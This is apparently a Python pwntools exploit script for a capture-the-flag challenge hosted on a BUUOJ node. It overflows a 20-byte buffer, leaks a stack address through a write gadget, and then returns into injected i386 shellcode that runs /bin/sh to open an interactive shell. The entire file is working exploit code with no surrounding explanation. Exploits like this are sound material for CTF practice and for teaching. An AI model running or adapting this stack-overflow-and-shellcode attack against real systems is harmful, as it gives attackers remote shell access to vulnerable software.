from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('start')
io = remote('node4.buuoj.cn', 29284)
write = 0x08048087

shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
payload = b'a' * 20 + p32(0x08048087)
io.sendafter('Let\'s start the CTF:', payload)
stack = u32(io.recvn(4))
payload = b'a' * 20 + p32(stack + 20) + shellcode
io.send(payload)
io.interactive()

